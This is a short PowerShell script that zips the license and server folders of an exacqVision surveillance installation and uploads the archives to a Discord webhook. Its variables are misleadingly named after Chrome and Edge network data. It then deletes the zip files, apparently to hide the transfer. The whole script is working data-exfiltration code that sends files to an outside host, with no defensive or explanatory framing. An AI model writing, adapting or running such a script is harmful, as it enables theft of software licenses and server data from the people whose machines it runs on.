# Get current Windows username
$currentUser = $env:USERNAME

# Define folder paths
$chromeNetworkFolder = "C:\Program Files\exacqVision\Client\licenses"
$edgeNetworkFolder = "C:\Program Files\exacqVision\Server"

# Define zip file names
$chromeZip = "$env:TEMP\ChromeNetwork.zip"
$edgeZip = "$env:TEMP\EdgeNetwork.zip"

# Compress the Chrome network folder
Compress-Archive -Path $chromeNetworkFolder -DestinationPath $chromeZip

# Compress the Edge network folder
Compress-Archive -Path $edgeNetworkFolder -DestinationPath $edgeZip

# Discord webhook upload function
function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position=0, Mandatory=$False)]
        [string]$file,
        [parameter(Position=1, Mandatory=$False)]
        [string]$text
    )

    $hookurl = "$dc"

    $Body = @{
        'username' = $env:username
        'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))) {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not ([string]::IsNullOrEmpty($file))) {
        curl.exe -F "file=@$file" $hookurl
    }
}

# Upload the zipped files to Discord
Upload-Discord -file $chromeZip
Upload-Discord -file $edgeZip

# Clean up: remove the zip files after upload
Remove-Item -Path $chromeZip, $edgeZip -Force
